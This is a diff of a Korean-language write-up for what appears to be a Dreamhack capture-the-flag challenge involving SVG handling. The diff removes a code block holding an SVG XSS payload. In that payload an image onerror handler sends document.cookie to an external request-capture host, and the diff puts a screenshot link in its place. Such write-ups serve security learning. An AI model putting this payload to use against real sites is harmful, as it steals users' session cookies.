@@ -73,15 +73,7 @@ SvgMover 로직 오류를 방지하기 위해 <path> 태그를 구문에 함께 
 https://tools.dreamhack.games/ 사용
 
 
-```<?xml version="1.0" encoding="UTF-8"?>
-
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
-
-  <path d="M 0 0 L 10 10" />
-
-  <image href="x" onerror="location.href=&apos;http://knzgsym.request.dreamhack.games/?flag=&apos;+encodeURIComponent(document.cookie)"/>
-
-</svg>```
+![alt text](image-8.png)
 
 ---
 
